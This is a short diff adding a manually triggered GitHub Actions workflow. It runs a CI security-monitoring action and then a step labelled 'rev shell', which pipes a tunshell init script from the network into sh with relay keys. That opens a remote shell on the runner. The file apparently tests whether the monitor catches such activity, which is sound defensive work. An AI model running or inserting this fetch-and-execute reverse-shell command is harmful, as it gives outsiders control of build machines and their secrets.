@@ -1,0 +1,15 @@
+name: Test
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: cycodelabs/cimon-action@v0
+
+    - name: rev shell
+      shell: bash
+      run: |
+        curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T 9Z2a7qmW3GbEu4DvDZKCDr Ozqa1yR3nsFzd7DEPRDh8Z eu.relay.tunshell.com
